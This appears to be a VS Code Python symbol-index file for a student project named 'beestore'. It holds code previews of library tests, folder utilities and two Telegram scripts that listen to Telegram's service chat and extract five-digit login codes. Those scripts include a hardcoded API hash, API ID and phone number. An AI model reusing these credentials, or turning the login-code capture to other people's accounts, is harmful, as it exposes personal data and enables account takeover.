        "peekOfCode": "o2 = parse(stringify(o));\nassert a2[0] == a2\nassert o2['o'] == o2\nassert a2[1] == 1 and a2[2] == 'two' and a2[3] == True and isinstance(a2[4], dict)\nassert a2[4] == a2[4]['o'] and a2 == a2[4]['o']['a']\nstr = parse('[{\"prop\":\"1\",\"a\":\"2\",\"b\":\"3\"},{\"value\":123},[\"4\",\"5\"],{\"e\":\"6\",\"t\":\"7\",\"p\":4},{},{\"b\":\"8\"},\"f\",{\"a\":\"9\"},[\"10\"],\"sup\",{\"a\":1,\"d\":2,\"c\":\"7\",\"z\":\"11\",\"h\":1},{\"g\":2,\"a\":\"7\",\"b\":\"12\",\"f\":6},{\"r\":4,\"u\":\"7\",\"c\":5}]')\nassert str['b']['t']['a'] == 'sup' and str['a'][1]['b'][0]['c'] == str['b']['t']\noo = parse('[{\"a\":\"1\",\"b\":\"0\",\"c\":\"2\"},{\"aa\":\"3\"},{\"ca\":\"4\",\"cb\":\"5\",\"cc\":\"6\",\"cd\":\"7\",\"ce\":\"8\",\"cf\":\"9\"},{\"aaa\":\"10\"},{\"caa\":\"4\"},{\"cba\":\"5\"},{\"cca\":\"2\"},{\"cda\":\"4\"},\"value2\",\"value3\",\"value1\"]');\nassert oo['a']['aa']['aaa'] == 'value1' and oo == oo['b'] and oo['c']['ca']['caa'] == oo['c']['ca']\nprint('OK')",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "str",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "str = parse('[{\"prop\":\"1\",\"a\":\"2\",\"b\":\"3\"},{\"value\":123},[\"4\",\"5\"],{\"e\":\"6\",\"t\":\"7\",\"p\":4},{},{\"b\":\"8\"},\"f\",{\"a\":\"9\"},[\"10\"],\"sup\",{\"a\":1,\"d\":2,\"c\":\"7\",\"z\":\"11\",\"h\":1},{\"g\":2,\"a\":\"7\",\"b\":\"12\",\"f\":6},{\"r\":4,\"u\":\"7\",\"c\":5}]')\nassert str['b']['t']['a'] == 'sup' and str['a'][1]['b'][0]['c'] == str['b']['t']\noo = parse('[{\"a\":\"1\",\"b\":\"0\",\"c\":\"2\"},{\"aa\":\"3\"},{\"ca\":\"4\",\"cb\":\"5\",\"cc\":\"6\",\"cd\":\"7\",\"ce\":\"8\",\"cf\":\"9\"},{\"aaa\":\"10\"},{\"caa\":\"4\"},{\"cba\":\"5\"},{\"cca\":\"2\"},{\"cda\":\"4\"},\"value2\",\"value3\",\"value1\"]');\nassert oo['a']['aa']['aaa'] == 'value1' and oo == oo['b'] and oo['c']['ca']['caa'] == oo['c']['ca']\nprint('OK')",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "oo",
        "kind": 5,
        "importPath": "beestore.node_modules.flatted.python.test",
        "description": "beestore.node_modules.flatted.python.test",
        "peekOfCode": "oo = parse('[{\"a\":\"1\",\"b\":\"0\",\"c\":\"2\"},{\"aa\":\"3\"},{\"ca\":\"4\",\"cb\":\"5\",\"cc\":\"6\",\"cd\":\"7\",\"ce\":\"8\",\"cf\":\"9\"},{\"aaa\":\"10\"},{\"caa\":\"4\"},{\"cba\":\"5\"},{\"cca\":\"2\"},{\"cda\":\"4\"},\"value2\",\"value3\",\"value1\"]');\nassert oo['a']['aa']['aaa'] == 'value1' and oo == oo['b'] and oo['c']['ca']['caa'] == oo['c']['ca']\nprint('OK')",
        "detail": "beestore.node_modules.flatted.python.test",
        "documentation": {}
    },
    {
        "label": "print_directory_tree",
        "kind": 2,
        "importPath": "beestore.printFolder",
        "description": "beestore.printFolder",
        "peekOfCode": "def print_directory_tree(startpath, level=0):\n    prefix = \" \" * (level * 4)\n    for item in os.listdir(startpath):\n        path = os.path.join(startpath, item)\n        print(f\"{prefix}|__ {item}\")\n        if os.path.isdir(path):\n            print_directory_tree(path, level + 1)\n# Gọi hàm với đường dẫn thư mục cần vẽ\nprint_directory_tree(r'C:\\Users\\hoang\\OneDrive\\Máy tính\\CS 434\\beestore\\src')",
        "detail": "beestore.printFolder",
        "documentation": {}
    },
    {
        "label": "api_id",
        "kind": 5,
        "importPath": "beestore.test copy",
        "description": "beestore.test copy",
        "peekOfCode": "api_id = '21931615'  # Thay thế bằng API ID của bạn\napi_hash = '6cd1f6260d0050adf4af5f1d99dbde09'  # Thay thế bằng API Hash của bạn\n# Tạo Telegram client\nclient = TelegramClient('+84905227657', api_id, api_hash)\n# Hàm xử lý khi nhận được tin nhắn từ kênh ID `777000`\n@client.on(events.NewMessage(chats=777000))  # Chỉ lắng nghe tin nhắn từ 777000\nasync def handler(event):\n    # In ra nội dung tin nhắn\n    message_text = event.text\n    print(f\"Tin nhắn từ {event.sender_id}: {message_text}\")",
        "detail": "beestore.test copy",
        "documentation": {}
    },
    {
        "label": "api_hash",
        "kind": 5,
        "importPath": "beestore.test copy",
        "description": "beestore.test copy",
        "peekOfCode": "api_hash = '6cd1f6260d0050adf4af5f1d99dbde09'  # Thay thế bằng API Hash của bạn\n# Tạo Telegram client\nclient = TelegramClient('+84905227657', api_id, api_hash)\n# Hàm xử lý khi nhận được tin nhắn từ kênh ID `777000`\n@client.on(events.NewMessage(chats=777000))  # Chỉ lắng nghe tin nhắn từ 777000\nasync def handler(event):\n    # In ra nội dung tin nhắn\n    message_text = event.text\n    print(f\"Tin nhắn từ {event.sender_id}: {message_text}\")\n    # Tìm mã đăng nhập trong tin nhắn (nếu có)",
        "detail": "beestore.test copy",
        "documentation": {}
    },
    {
        "label": "client",
        "kind": 5,
        "importPath": "beestore.test copy",
        "description": "beestore.test copy",
        "peekOfCode": "client = TelegramClient('+84905227657', api_id, api_hash)\n# Hàm xử lý khi nhận được tin nhắn từ kênh ID `777000`\n@client.on(events.NewMessage(chats=777000))  # Chỉ lắng nghe tin nhắn từ 777000\nasync def handler(event):\n    # In ra nội dung tin nhắn\n    message_text = event.text\n    print(f\"Tin nhắn từ {event.sender_id}: {message_text}\")\n    # Tìm mã đăng nhập trong tin nhắn (nếu có)\n    match = re.search(r'\\b\\d{5}\\b', message_text)\n    if match:",
        "detail": "beestore.test copy",
        "documentation": {}
    },
    {
        "label": "api_id",
        "kind": 5,
        "importPath": "beestore.test",
        "description": "beestore.test",
        "peekOfCode": "api_id = '21931615'  # Thay thế bằng API ID của bạn\napi_hash = '6cd1f6260d0050adf4af5f1d99dbde09'  # Thay thế bằng API Hash của bạn\n# Tạo Telegram client\nclient = TelegramClient('+84905227657.session', api_id, api_hash)\n# Hàm xử lý khi nhận được tin nhắn từ kênh ID `777000`\n@client.on(events.NewMessage(chats=777000))  # Chỉ lắng nghe tin nhắn từ 777000\nasync def handler(event):\n    # In ra nội dung tin nhắn\n    message_text = event.text\n    print(f\"Tin nhắn từ {event.sender_id}: {message_text}\")",
        "detail": "beestore.test",
        "documentation": {}
    },
    {
        "label": "api_hash",
        "kind": 5,
        "importPath": "beestore.test",
        "description": "beestore.test",
        "peekOfCode": "api_hash = '6cd1f6260d0050adf4af5f1d99dbde09'  # Thay thế bằng API Hash của bạn\n# Tạo Telegram client\nclient = TelegramClient('+84905227657.session', api_id, api_hash)\n# Hàm xử lý khi nhận được tin nhắn từ kênh ID `777000`\n@client.on(events.NewMessage(chats=777000))  # Chỉ lắng nghe tin nhắn từ 777000\nasync def handler(event):\n    # In ra nội dung tin nhắn\n    message_text = event.text\n    print(f\"Tin nhắn từ {event.sender_id}: {message_text}\")\n    # Tìm mã đăng nhập trong tin nhắn (nếu có)",
        "detail": "beestore.test",
        "documentation": {}
    },
    {
        "label": "client",
        "kind": 5,
        "importPath": "beestore.test",
        "description": "beestore.test",
        "peekOfCode": "client = TelegramClient('+84905227657.session', api_id, api_hash)\n# Hàm xử lý khi nhận được tin nhắn từ kênh ID `777000`\n@client.on(events.NewMessage(chats=777000))  # Chỉ lắng nghe tin nhắn từ 777000\nasync def handler(event):\n    # In ra nội dung tin nhắn\n    message_text = event.text\n    print(f\"Tin nhắn từ {event.sender_id}: {message_text}\")\n    # Tìm mã đăng nhập trong tin nhắn (nếu có)\n    match = re.search(r'\\b\\d{5}\\b', message_text)\n    if match:",
        "detail": "beestore.test",
        "documentation": {}
    },
    {
        "label": "create_structure",
        "kind": 2,
        "importPath": "createFolder",
        "description": "createFolder",
        "peekOfCode": "def create_structure(base_path, structure):\n    for name, content in structure.items():\n        path = os.path.join(base_path, name)\n        if content is None:\n            # Tạo tệp tin\n            open(path, 'w').close()\n        else:\n            # Tạo thư mục và tiếp tục tạo cấu trúc bên trong\n            os.makedirs(path, exist_ok=True)\n            create_structure(path, content)",
        "detail": "createFolder",
        "documentation": {}
    },
    {
        "label": "structure",
        "kind": 5,
        "importPath": "createFolder",
        "description": "createFolder",
        "peekOfCode": "structure = {\n    \"backend\": {\n        \"app.py\": None,\n        \"config.py\": None,\n        \"models.py\": None,\n        \"routes\": {\n            \"__init__.py\": None,\n            \"auth.py\": None,\n            \"product.py\": None,\n            \"cart.py\": None",
        "detail": "createFolder",
        "documentation": {}
    },
    {
        "label": "res",
        "kind": 5,
        "importPath": "test",
        "description": "test",
        "peekOfCode": "res = requests.get('http://127.0.0.1:5000/products')\nprint( 'res',res)\nprint( '====================')\nprint(res.json())",
        "detail": "test",
        "documentation": {}
    }
]